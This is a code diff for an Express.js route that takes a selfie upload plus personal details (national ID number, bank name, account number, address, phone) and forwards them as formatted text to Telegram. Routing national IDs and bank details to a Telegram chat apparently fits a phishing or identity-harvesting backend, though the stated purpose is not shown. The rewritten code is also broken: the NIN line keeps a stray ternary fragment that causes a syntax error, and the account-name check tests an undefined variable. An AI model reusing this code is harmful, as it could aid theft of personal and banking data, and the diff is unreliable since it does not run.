@@ -109,44 +109,27 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
         const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
-const nameLine = name ? `<b>Name:</b> ${name}` : '';
-const genderLine = gender ? `<b>Gender:</b> ${gender}` : '';
-const dobLine = dob ? `<b>Date of Birth:</b> ${dob}` : '';
-const emailLine = email ? `<b>Email:</b> ${email}` : '';
-const employLine = employ ? `<b>Employment Status:</b> ${employ}` : '';
-const phoneLine = phone ? `<b>Phone:</b> ${phone}` : '';
-const maritalLine = marital ? `<b>Marital Status:</b> ${marital}` : '';
-const cityLine = city ? `<b>City:</b> ${city}` : '';
-const stateLine = state ? `<b>State:</b> ${state}` : '';
-const addressLine = address ? `<b>Address:</b> ${address}` : '';
-const lgaLine = lga ? `<b>Local Government Area:</b> ${lga}` : '';
-const ninLine = nin ? `<b>NIN:</b> ${nin}` : '';
-const bankNameLine = bankName ? `<b>Bank Name:</b> ${bankName}` : '';
-const accountNumberLine = accountNumber ? `<b>Account Number:</b> ${accountNumber}` : '';
-const accountNameLine = accountName ? `<b>Account Name:</b> ${accountName}` : '';
-
+const lines = ['📋 <b>New Form Submission</b>'];
+    
+if (name) lines.push(`<b>Name:</b> ${name}`);
+if (gender) lines.push(`<b>Gender:</b> ${gender}`);
+if (dob) lines.push(`<b>Date of Birth:</b> ${dob}`);
+if (email) lines.push(`<b>Email:</b> ${email}`);
+if (employ) lines.push(`<b>Employment Status:</b> ${employ}`);
+if (phone) lines.push(`<b>Phone:</b> ${phone}`);
+if (marital) lines.push(`<b>Marital Status:</b> ${marital}`);
+if (city) lines.push(`<b>City:</b> ${city}`);
+if (state) lines.push(`<b>State:</b> ${state}`);
+if (address) lines.push(`<b>Address:</b> ${address}`);
+if (lga) lines.push(`<b>Local Government Area:</b> ${lga}`);
+if (nin) lines.push(`<b>NIN:</b> ${nin}` : '';
+if (bankName) lines.push(`<b>Bank Name:</b> ${bankName}`);
+if (accountNumber) lines.push(`<b>Account Number:</b> ${accountNumber}`);
+if (accountNameLine) lines.push(`<b>Account Name:</b> ${accountName}`);
+   lines.push(`🕒 <b>Submitted at:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`);
+    
         // Format text data for Telegram
-        const formattedText = `
-📋 <b>New Form Submission</b>
-
- ${nameLine}
- ${genderLine}
- ${dobLine}
- ${emailLine}
- ${employLine}
- ${phoneLine}
- ${maritalLine}
- ${cityLine}
- ${stateLine}
- ${addressLine}
- ${lgaLine}
- ${ninLine}
- ${bankNameLine}
- ${accountNumberLine}
- ${accountNameLine}
-
-🕒 <b>Submitted at:</b> ${new Date().toLocaleString()}
-        `.trim();
+        const formattedText = lines.join('\n').trim();
 
         // Send text data to Telegram
         await sendTextToTelegram(formattedText);
